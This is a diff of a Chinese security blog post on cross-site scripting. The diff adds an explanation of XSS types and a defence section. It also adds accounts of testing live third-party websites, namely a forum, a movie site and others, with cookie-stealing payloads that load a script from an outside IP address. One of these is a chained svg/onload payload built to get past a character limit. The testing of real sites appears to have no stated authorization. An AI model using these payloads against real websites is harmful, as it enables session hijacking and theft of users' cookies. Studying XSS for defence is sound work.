@@ -85,16 +85,41 @@
 
 
 
+<meta name="description" content="** 白帽巫师MR.Poter">
 <meta property="og:type" content="article">
 <meta property="og:title" content="web安全之xss简单小计">
 <meta property="og:url" content="https://shawnleon.github.io/2016/08/12/websec-xss/index.html">
 <meta property="og:site_name" content="THE WEAK ARE HARD TO GET THE FAIR">
+<meta property="og:description" content="** 白帽巫师MR.Poter">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/hp.jpg">
 <meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/websecxss.jpg">
 <meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/xss.png">
-<meta property="og:updated_time" content="2016-08-19T02:06:36.614Z">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/10.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/11.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/12.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/13.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/14.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/16.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/17.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/18.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/19.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/20.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/1.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/2.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/3.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/4.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/5.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/6.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/7.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/21.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/22.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/23.png">
+<meta property="og:image" content="https://shawnleon.github.io/images/websec-xss/xssd.png">
+<meta property="og:updated_time" content="2016-08-26T14:44:38.186Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="web安全之xss简单小计">
-<meta name="twitter:image" content="https://shawnleon.github.io/images/websec-xss/websecxss.jpg">
+<meta name="twitter:description" content="** 白帽巫师MR.Poter">
+<meta name="twitter:image" content="https://shawnleon.github.io/images/websec-xss/hp.jpg">
 
 
 
@@ -339,8 +364,8 @@
       
 
       
-        <p><img src="/images/websec-xss/websecxss.jpg" alt="image"></p>
-<h2 id=""><a href="#" class="headerlink" title=""></a><a id="more"></a></h2><h1 id="0x00-什么是xss？危害如何？"><a href="#0x00-什么是xss？危害如何？" class="headerlink" title="0x00 什么是xss？危害如何？"></a>0x00 什么是xss？危害如何？</h1><hr>
+        <p><img src="/images/websec-xss/hp.jpg" alt="image"><br>** 白帽巫师MR.Poter<br><a id="more"></a><br><img src="/images/websec-xss/websecxss.jpg" alt="image"></p>
+<h2 id="白帽巫师都是报团成长的。主心骨，团结，无畏的精神缺一不可。"><a href="#白帽巫师都是报团成长的。主心骨，团结，无畏的精神缺一不可。" class="headerlink" title="** 白帽巫师都是报团成长的。主心骨，团结，无畏的精神缺一不可。"></a>** 白帽巫师都是报团成长的。主心骨，团结，无畏的精神缺一不可。</h2><h1 id="0x00-什么是xss？危害？"><a href="#0x00-什么是xss？危害？" class="headerlink" title="0x00 什么是xss？危害？"></a>0x00 什么是xss？危害？</h1><hr>
 <h2 id="什么是xss？"><a href="#什么是xss？" class="headerlink" title="什么是xss？"></a>什么是xss？</h2><p>跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击盗取用户cookie和session，、破坏页面结构、重定向到其它网站等。<br>跨站脚本重要的是脚本，跨站是浏览器的特性，不是缺陷。造成这样的假象是因为大多说的XSS攻击都采用嵌入远程或者第三方域的脚本资源。这样的脚本主要有javascript和actionscript。<br>xss这类攻击是浏览器来解析执行的，浏览器会严格按照同源策略解析，不符合约定的不会执行。</p>
 <h2 id="xss的危害有多大？"><a href="#xss的危害有多大？" class="headerlink" title="xss的危害有多大？"></a>xss的危害有多大？</h2><p>真正的xss攻击不是简单的弹个测试的框，而是诸如<br><code>&lt;script src=“http://xxx/x.js”&gt;&lt;/script&gt;</code> 的js代码。<br>危害是由行为决定的，在各大漏洞平台总结的XSS可能造成的行为及危害有</p>
 <blockquote>
@@ -366,22 +391,31 @@
 <li>DOM XSS</li>
 <li>flash xss</li>
 <li>m XSS</li>
-<li></li>
 </ul>
 </blockquote>
 <h2 id="1-反射（非持久）型xss攻击"><a href="#1-反射（非持久）型xss攻击" class="headerlink" title="1.反射（非持久）型xss攻击"></a>1.反射（非持久）型xss攻击</h2><p>非持久型xss攻击是一次性的，仅对当次的页面访问产生影响。非持久型xss攻击要求用户访问一个被攻击者篡改后的链接，用户访问该链接时，被植入的攻击脚本被用户游览器执行，从而达到攻击目的。<br><img src="/images/websec-xss/xss.png" alt="image"></p>
-<h2 id="2-储存（持久）型xss攻击"><a href="#2-储存（持久）型xss攻击" class="headerlink" title="2.储存（持久）型xss攻击"></a>2.储存（持久）型xss攻击</h2><p>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。</p>
+<h2 id="2-储存（持久）型xss攻击"><a href="#2-储存（持久）型xss攻击" class="headerlink" title="2.储存（持久）型xss攻击"></a>2.储存（持久）型xss攻击</h2><p>持久型xss攻击会把攻击者的数据存储在服务器端，攻击行为将伴随着攻击数据一直存在。如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃cookie等</p>
+<h2 id="其他XSS暂时未接触"><a href="#其他XSS暂时未接触" class="headerlink" title="其他XSS暂时未接触"></a>其他XSS暂时未接触</h2><hr>
+<h1 id="0x02-实例"><a href="#0x02-实例" class="headerlink" title="0x02 实例"></a>0x02 实例</h1><hr>
+<h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><h3 id="某赴美生子"><a href="#某赴美生子" class="headerlink" title="某赴美生子"></a>某赴美生子</h3><p>说实话，我也想子女是外国的。欧洲瑞士瑞典乌克兰那边挺好。<br>因为写日记得经过2D审核，毕竟这个网站是赚钱的，不能让咱们随便发日志文件。所以我只 用搜索框得到自己的饼干（cookie）。</p>
+<p>验证了xss的弹窗<br><img src="/images/websec-xss/10.png" alt="image"><br>，于是我换成获取饼干的js代码”/&gt;<script src="http://115.159.126.186/x.js"></script>  并在源码中插入有效成功<br><img src="/images/websec-xss/11.png" alt="image"><br>成功看到连个url请求说明可以获取饼干<br><img src="/images/websec-xss/12.png" alt="image"><br><img src="/images/websec-xss/13.png" alt="image"><br>然后我再次输入”/&gt;<script src="http://115.159.126.186/x.js"></script><br>在我外网地址获取到自己饼干<br><img src="/images/websec-xss/14.png" alt="image"></p>
+<h3 id="人物周刊"><a href="#人物周刊" class="headerlink" title="人物周刊"></a>人物周刊</h3><p>个人主页</p>
+<p><img src="/images/websec-xss/16.png" alt="image"><br>用户名可以显示，我们找到了输出点，测试下：”&lt;&gt;/<br>发现用户名直接在P标签里面<br><img src="/images/websec-xss/17.png" alt="image"><br>所以我们直接插入弹窗代码试试<br>可以弹窗<br><img src="/images/websec-xss/18.png" alt="image"><br>不用抓包，直接插入就加载了JS代码<br><img src="/images/websec-xss/19.png" alt="image"><br>然后把获取饼干（cookie）的js代码加入查看源码发现只显示26个字符<br><img src="/images/websec-xss/20.png" alt="image"><br>所以要在26个字符内写入自己外网JS 如何缩短代码是个问题。然后就放弃了，毕竟只是测试。</p>
+<h2 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h2><h3 id="某手机论坛"><a href="#某手机论坛" class="headerlink" title="某手机论坛"></a>某手机论坛</h3><p>** 尝试发帖验证是否字符实体化。<br><img src="/images/websec-xss/1.png" alt="image"></p>
+<p><strong> 查看源码发现<br><img src="/images/websec-xss/2.png" alt="image">
+</strong> 尝试抓包修改并放行<br>代码：<br><code>&lt;/div&gt;&lt;script&gt;alert(0)&lt;/script&gt;</code>    <code>//因为在div标签里面所以得闭合标签,没引用前面这段代码，本地测试弹窗了。。</code><br><img src="/images/websec-xss/3.png" alt="image"><br><strong> 就看到了弹窗<br><img src="/images/websec-xss/4.png" alt="image">
+</strong> 在弹窗之后我尝试回帖抓包插入获取饼干代码只有一个js的url请求不知道为什么<br><img src="/images/websec-xss/5.png" alt="image"></p>
+<p>** 没有php的url请求就无法实现获取饼干(cookie)。</p>
+<p><strong> 在改写了js文件后，有了php请求<br><img src="/images/websec-xss/6.png" alt="image">
+</strong> 然后重新进入帖子，获取到自己的饼干,在自己外网查看获取到的饼干。<br><img src="/images/websec-xss/7.png" alt="image"><br>** 只做测试，未尝试其他，把自己帖子删除了。不知道过去那么长时间修复了没有。</p>
+<h3 id="某电影网"><a href="#某电影网" class="headerlink" title="某电影网"></a>某电影网</h3><p>在可关注话题处，在验证了弹窗之后，由于只有30字符输入限制，所以</p>
+<p>重新构造payload<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;svg/onload=&quot;b=&apos;http://123&apos;&quot;&gt;</div><div class="line">&lt;svg/onload=&quot;b+=&apos;.123.&apos;&quot;&gt;</div><div class="line">&lt;svg/onload=&quot;b+=&apos;126.186&apos;&quot;&gt;</div><div class="line">&lt;svg/onload=&quot;b+=&apos;/xx.js&apos;&quot;&gt;</div><div class="line">&lt;svg/onload=&quot;$loadJs(b)&quot;&gt;</div></pre></td></tr></table></figure></p>
+<p>之后就成功请求.js  .php<br><img src="/images/websec-xss/21.png" alt="image"><br><img src="/images/websec-xss/22.png" alt="image"><br>刷新时光网之后的时间是我服务器的时间，右下角是我电脑的时间。<br><img src="/images/websec-xss/23.png" alt="image"></p>
+<p>如果某个很厉害的玩家，嗯，被关注度很高，然后能打到好多cookie啊。</p>
 <hr>
-<h2 id="0x02-this"><a href="#0x02-this" class="headerlink" title="0x02 this"></a>0x02 this</h2><hr>
-<p>this</p>
-<h3 id="this"><a href="#this" class="headerlink" title="this"></a>this</h3><p>this</p>
-<hr>
-<h2 id="0x03-this"><a href="#0x03-this" class="headerlink" title="0x03 this"></a>0x03 this</h2><hr>
-<p>this</p>
-<h3 id="this-1"><a href="#this-1" class="headerlink" title="this"></a>this</h3><p>this</p>
-<hr>
-<h2 id="0x04-this"><a href="#0x04-this" class="headerlink" title="0x04 this"></a>0x04 this</h2><hr>
-<p>this</p>
+<h2 id="0x04-防御"><a href="#0x04-防御" class="headerlink" title="0x04 防御"></a>0x04 防御</h2><hr>
+<p>几乎每篇谈论 XSS 的文章，结尾多少都会提到如何防止，然而大多万变不离其宗。要转义什么，要过滤什么，不要忘了什么之类的。尽管都是众所周知的道理，但 XSS 漏洞十几年来几乎从未中断过，不乏一些大网站也时常爆出，小网站更是家常便饭。<br>而本文介绍的则是另一种预防思路 —— 通过前端监控脚本，让每一个用户都参与漏洞的监控和上报。<br>详情可见源博客<a href="http://fex.baidu.com/blog/2014/06/xss-frontend-firewall-1/" target="_blank" rel="external">XSS 前端防火墙 —— 内联事件拦截</a></p>
+<p>freebuf也有篇借上述博客谈的 <a href="http://www.freebuf.com/articles/web/110583.html" target="_blank" rel="external">前端xss报警</a><br><img src="/images/websec-xss/xssd.png" alt="image"></p>
 <p><strong>题外话：如果你对本站文章字体有任何不适，请告知我，我会回复你，字体问题请配置浏览器，调到对眼睛舒适的大小;默认不允许转载，除非转载注明出处。</strong></p>
 <p>end</p>
 
@@ -607,15 +641,19 @@
                 </li>
               
                 <li class="links-of-blogroll-item">
-                  <a href="http://liulangdelmao.github.io/" title="卓卓" target="_blank">卓卓</a>
-                </li>
-              
-                <li class="links-of-blogroll-item">
                   <a href="https://nouername.github.io" title="帅乔飞" target="_blank">帅乔飞</a>
                 </li>
               
                 <li class="links-of-blogroll-item">
                   <a href="https://zhmy1228.github.io" title="moon明明如月" target="_blank">moon明明如月</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="卓卓" target="_blank">卓卓</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.ctqt.ml/" title="春天的春，晴天的晴" target="_blank">春天的春，晴天的晴</a>
                 </li>
               
             </ul>
@@ -631,7 +669,7 @@
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#"><span class="nav-number">1.</span> <span class="nav-text"></span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-什么是xss？危害如何？"><span class="nav-number"></span> <span class="nav-text">0x00 什么是xss？危害如何？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是xss？"><span class="nav-number">1.</span> <span class="nav-text">什么是xss？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss的危害有多大？"><span class="nav-number">2.</span> <span class="nav-text">xss的危害有多大？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-xss的分类"><span class="nav-number"></span> <span class="nav-text">0x01 xss的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-反射（非持久）型xss攻击"><span class="nav-number">1.</span> <span class="nav-text">1.反射（非持久）型xss攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-储存（持久）型xss攻击"><span class="nav-number">2.</span> <span class="nav-text">2.储存（持久）型xss攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-this"><span class="nav-number">3.</span> <span class="nav-text">0x02 this</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#this"><span class="nav-number">3.1.</span> <span class="nav-text">this</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-this"><span class="nav-number">4.</span> <span class="nav-text">0x03 this</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#this-1"><span class="nav-number">4.1.</span> <span class="nav-text">this</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-this"><span class="nav-number">5.</span> <span class="nav-text">0x04 this</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#白帽巫师都是报团成长的。主心骨，团结，无畏的精神缺一不可。"><span class="nav-number">1.</span> <span class="nav-text">** 白帽巫师都是报团成长的。主心骨，团结，无畏的精神缺一不可。</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-什么是xss？危害？"><span class="nav-number"></span> <span class="nav-text">0x00 什么是xss？危害？</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#什么是xss？"><span class="nav-number">1.</span> <span class="nav-text">什么是xss？</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#xss的危害有多大？"><span class="nav-number">2.</span> <span class="nav-text">xss的危害有多大？</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-xss的分类"><span class="nav-number"></span> <span class="nav-text">0x01 xss的分类</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-反射（非持久）型xss攻击"><span class="nav-number">1.</span> <span class="nav-text">1.反射（非持久）型xss攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-储存（持久）型xss攻击"><span class="nav-number">2.</span> <span class="nav-text">2.储存（持久）型xss攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#其他XSS暂时未接触"><span class="nav-number">3.</span> <span class="nav-text">其他XSS暂时未接触</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-实例"><span class="nav-number"></span> <span class="nav-text">0x02 实例</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#反射型xss"><span class="nav-number">1.</span> <span class="nav-text">反射型xss</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#某赴美生子"><span class="nav-number">1.1.</span> <span class="nav-text">某赴美生子</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#人物周刊"><span class="nav-number">1.2.</span> <span class="nav-text">人物周刊</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#存储型XSS"><span class="nav-number">2.</span> <span class="nav-text">存储型XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#某手机论坛"><span class="nav-number">2.1.</span> <span class="nav-text">某手机论坛</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#某电影网"><span class="nav-number">2.2.</span> <span class="nav-text">某电影网</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-防御"><span class="nav-number">3.</span> <span class="nav-text">0x04 防御</span></a></li></ol></div>
             
           </div>
         </section>
